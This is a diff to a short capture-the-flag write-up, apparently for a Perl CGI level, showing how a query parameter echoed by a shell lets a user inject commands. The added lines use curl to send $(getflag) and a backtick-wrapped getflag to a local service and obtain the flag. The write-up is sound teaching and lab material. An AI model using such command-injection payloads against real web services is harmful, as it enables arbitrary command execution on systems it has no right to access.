@@ -14,6 +14,9 @@ the web site parse the query string params from url and print it with echo  in t
 we can try to pass a variable name to the x for exemple 
     "localhost:4747/?x=ramoukha" and we got => ramoukha.
 let's inject the getflag command and see wat going to happen 
-    localhost:4747/?x=$(getflag)
+    curl localhost:4747/?x=$(getflag)
+    or
+    curl '127.0.0.1:4747/level04.pl?x=`getflag`'
+    
 and we got the flag 
 
